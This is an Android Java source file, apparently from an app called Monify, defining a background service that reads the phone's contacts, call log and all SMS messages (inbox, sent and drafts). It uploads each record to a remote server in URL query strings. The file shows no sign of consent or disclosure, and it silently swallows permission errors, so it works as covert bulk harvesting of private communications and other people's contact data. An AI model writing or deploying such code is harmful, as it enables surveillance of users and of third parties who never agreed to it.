package com.sarl.monify;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.text.LoginFilter;
import android.util.Log;

import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.common.Priority;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.JSONArrayRequestListener;
import com.google.gson.Gson;
import com.sarl.monify.dataClasses.CallRecord;
import com.sarl.monify.dataClasses.Contact;
import com.sarl.monify.dataClasses.Sms;

import org.json.JSONArray;

import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * Created by knightshade on 11/3/17.
 */

public class DataUploadService extends IntentService {

    private ContentResolver cr;
    private String dataUploadService = "DATA_UPLOAD_SERVICE";
    private Uri inboxUri = Uri.parse("content://sms/inbox");
    private Uri outboxUri = Uri.parse("content://sms/sent");
    private Uri draftUri = Uri.parse("content://sms/draft");
    private String[] smsColumns = {"_id", "address", "body", "date"};
    private Gson gson = new Gson();

    public DataUploadService() {
        super("DataUploadService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        AndroidNetworking.initialize(getApplicationContext());
        Log.d(dataUploadService, "onHandleIntent executing.");
        cr = getContentResolver();
        uploadContact();
        uploadCallRecords();
        uploadSms();
    }

    private void uploadContact() {
        ArrayList<Contact> contactArrayList = new ArrayList<>();

        Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                null, null, null);
        while (c.moveToNext()) {
            String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            contactArrayList.add(new Contact(name, number));
        }

        c.close();

        Log.d("CONTACT", contactArrayList.get(0).toString() + contactArrayList.size());

        for (int i = 0; i < contactArrayList.size(); i++) {
            String[] mParams = {contactArrayList.get(i).getName(), contactArrayList.get(i).getNumber()};
            ContactsPut contactsPut = new ContactsPut();
            contactsPut.execute(mParams);
        }

    }

    private void uploadCallRecords() {
        ArrayList<CallRecord> callRecordArrayList = new ArrayList<>();
        String[] projection = new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};

        try {
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI, projection, null,
                    null, CallLog.Calls.DATE + " DESC");

            if (c.getCount() > 0) {
                c.moveToFirst();
                do {

                    String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String dateandtime = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
                    String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                    callRecordArrayList.add(new CallRecord(number, dateandtime, duration));

                } while (c.moveToNext());
                c.close();

            }
            Log.d("CALL_RECORDS", callRecordArrayList.get(0).toString() + callRecordArrayList.size());
        } catch (SecurityException e) {
            Log.d("CALL_INFO", "Security Exception occured.");
        }

        for (int i = 0; i < callRecordArrayList.size(); i++) {
            String[] mParams = {callRecordArrayList.get(i).getNumber(), callRecordArrayList.get(i).getDateAndTime(), callRecordArrayList.get(i).getDuration()};
            CallsPut callsPut = new CallsPut();
            callsPut.execute(mParams);
        }


    }

    private void uploadSms() {
        Log.d("SMS", "Entered into SMS");
        ArrayList<Sms> smsArrayList = new ArrayList<>();
        Cursor cinbox = cr.query(inboxUri, smsColumns, null, null, null);
        Cursor coutbox = cr.query(outboxUri, smsColumns, null, null, null);
        Cursor cdraft = cr.query(draftUri, smsColumns, null, null, null);
        Log.d("SMS", "Cursor end reached");
        while (cinbox.moveToNext()) {
            Log.d("SMS", "INBOX");
            String number = cinbox.getString(cinbox.getColumnIndex(Telephony.Sms.ADDRESS));
            String message = cinbox.getString(cinbox.getColumnIndex(Telephony.Sms.BODY));
            String timestamp = cinbox.getString(cinbox.getColumnIndex(Telephony.Sms.DATE));
            String type = "Inbox";
            smsArrayList.add(new Sms(number, message, timestamp, type));
        }

        while (coutbox.moveToNext()) {
            Log.d("SMS", "OUTBOX");
            String number = coutbox.getString(coutbox.getColumnIndex(Telephony.Sms.ADDRESS));
            String message = coutbox.getString(coutbox.getColumnIndex(Telephony.Sms.BODY));
            String timestamp = coutbox.getString(coutbox.getColumnIndex(Telephony.Sms.DATE));
            String type = "Outbox";
            smsArrayList.add(new Sms(number, message, timestamp, type));
        }

        while (cdraft.moveToNext()) {
            Log.d("SMS", "DRAFT");
            String number = cdraft.getString(cdraft.getColumnIndex(Telephony.Sms.ADDRESS));
            String message = cdraft.getString(cdraft.getColumnIndex(Telephony.Sms.BODY));
            String timestamp = cdraft.getString(cdraft.getColumnIndex(Telephony.Sms.DATE));
            String type = "Draft";
            smsArrayList.add(new Sms(number, message, timestamp, type));
        }

        cinbox.close();
        coutbox.close();
        cdraft.close();

        for (int i = 0; i < smsArrayList.size(); i++) {
            String number = smsArrayList.get(i).getNumber();
            String message = smsArrayList.get(i).getMessage();
            String timeStamp = smsArrayList.get(i).getTimestamp();
            String type = smsArrayList.get(i).getType();

            String[] mParams = {number, message, timeStamp, type};
            SMSPut smsPut = new SMSPut();
            smsPut.execute(mParams);
        }
    }

    private class ContactsPut extends AsyncTask<String, Void, Integer> {

        protected void onPreExecute() {
        }

        protected Integer doInBackground(String... params) {
            try {
                String name = params[0];
                String number = params[1];
                if (number.startsWith("+91")) number = number.substring(3);
                if (number.startsWith("91")) number = number.substring(2);
                number = number.replaceAll("\\s+", "");
                number = number.replaceAll("[^a-zA-Z0-9]", "");
                URL url = new URL(Constants.URL.Contact_Put + "?name=" + name + "&number=" + number);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoInput(true);
                connection.setDoOutput(true);
                connection.setRequestMethod("GET");


                Uri.Builder _data = new Uri.Builder().appendQueryParameter("s", "s");
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream(), "UTF-8"));
                writer.write(_data.build().getEncodedQuery());
                writer.flush();
                writer.close();

                InputStreamReader in = new InputStreamReader(connection.getInputStream());
                StringBuilder jsonResults = new StringBuilder();
                // Load the results into a StringBuilder
                int read;
                char[] buff = new char[1024];
                while ((read = in.read(buff)) != -1) {
                    jsonResults.append(buff, 0, read);
                }
                connection.disconnect();

                return 1;
            } catch (Exception e) {
                e.printStackTrace();
            }

            return 1;
        }

        protected void onPostExecute(Integer result) {

        }
    }

    private class SMSPut extends AsyncTask<String, Void, Integer> {

        protected void onPreExecute() {
        }

        protected Integer doInBackground(String... params) {
            try {
                String number = params[0];
                String message = params[1];
                message = message.replaceAll("[^a-zA-Z0-9 ]", "");
                String timeStamp = params[2];
                String type = params[3];

                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(Long.parseLong(timeStamp));

                int mYear = calendar.get(Calendar.YEAR);
                int mMonth = calendar.get(Calendar.MONTH);
                int mDay = calendar.get(Calendar.DAY_OF_MONTH);
                int mHour = calendar.get(Calendar.HOUR_OF_DAY);
                int mMin = calendar.get(Calendar.MINUTE);
                int mSecond = calendar.get(Calendar.SECOND);

                timeStamp = mYear + "-" + mMonth + "-" + mDay + " " + mHour + ":" + mMin + ":" + mSecond;
                URL url = new URL(Constants.URL.Sms_Put + "?number=" + number + "&message=" + message + "&time=" + timeStamp + "&type=" + type);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoInput(true);
                connection.setDoOutput(true);
                connection.setRequestMethod("GET");


                Uri.Builder _data = new Uri.Builder().appendQueryParameter("s", "s");
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream(), "UTF-8"));
                writer.write(_data.build().getEncodedQuery());
                writer.flush();
                writer.close();

                InputStreamReader in = new InputStreamReader(connection.getInputStream());
                StringBuilder jsonResults = new StringBuilder();
                // Load the results into a StringBuilder
                int read;
                char[] buff = new char[1024];
                while ((read = in.read(buff)) != -1) {
                    jsonResults.append(buff, 0, read);
                }
                connection.disconnect();


                return 1;
            } catch (Exception e) {
                e.printStackTrace();
            }

            return 1;
        }

        protected void onPostExecute(Integer result) {

        }
    }

    private class CallsPut extends AsyncTask<String, Void, Integer> {

        protected void onPreExecute() {
        }

        protected Integer doInBackground(String... params) {
            try {
                String number = params[0];
                if (number.startsWith("+91")) number = number.substring(3);
                if (number.startsWith("91")) number = number.substring(2);
                number = number.replaceAll("\\s+", "");
                number = number.replaceAll("[^a-zA-Z0-9]", "");
                String timeStamp = params[1];
                String durations = params[2];

                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(Long.parseLong(timeStamp));

                int mYear = calendar.get(Calendar.YEAR);
                int mMonth = calendar.get(Calendar.MONTH);
                int mDay = calendar.get(Calendar.DAY_OF_MONTH);
                int mHour = calendar.get(Calendar.HOUR_OF_DAY);
                int mMin = calendar.get(Calendar.MINUTE);
                int mSecond = calendar.get(Calendar.SECOND);

                timeStamp = mYear + "-" + mMonth + "-" + mDay + " " + mHour + ":" + mMin + ":" + mSecond;
                URL url = new URL(Constants.URL.Calls_Put + "?number=" + number + "&time=" + timeStamp + "&durations=" + durations);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoInput(true);
                connection.setDoOutput(true);
                connection.setRequestMethod("GET");


                Uri.Builder _data = new Uri.Builder().appendQueryParameter("s", "s");
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream(), "UTF-8"));
                writer.write(_data.build().getEncodedQuery());
                writer.flush();
                writer.close();

                InputStreamReader in = new InputStreamReader(connection.getInputStream());
                StringBuilder jsonResults = new StringBuilder();
                // Load the results into a StringBuilder
                int read;
                char[] buff = new char[1024];
                while ((read = in.read(buff)) != -1) {
                    jsonResults.append(buff, 0, read);
                }
                connection.disconnect();

                return 1;
            } catch (Exception e) {
                e.printStackTrace();
            }

            return 1;
        }

        protected void onPostExecute(Integer result) {

        }
    }
}
